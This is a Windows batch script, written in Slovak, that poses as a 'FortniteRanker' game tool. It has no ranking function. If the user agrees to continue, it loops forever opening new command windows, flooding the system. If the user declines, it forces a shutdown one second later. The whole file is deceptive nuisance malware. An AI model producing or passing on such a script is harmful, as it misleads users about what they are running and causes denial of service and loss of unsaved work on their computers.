@echo off
color 4
title FortniteRanker
echo Dobry den pan %username%
echo Vitajte pri programe FortniteRanker
echo Chcete pokracovat ? (A/N)
set /p kkt=
if %kkt% == a goto loop
if %kkt% == n goto vypnut
:loop
start
timeout /t 5 /nobreak
start
timeout /t 2 /nobreak
start
timeout /t 1 /nobreak
goto loop
:vypnut
shutdown -s -t 1
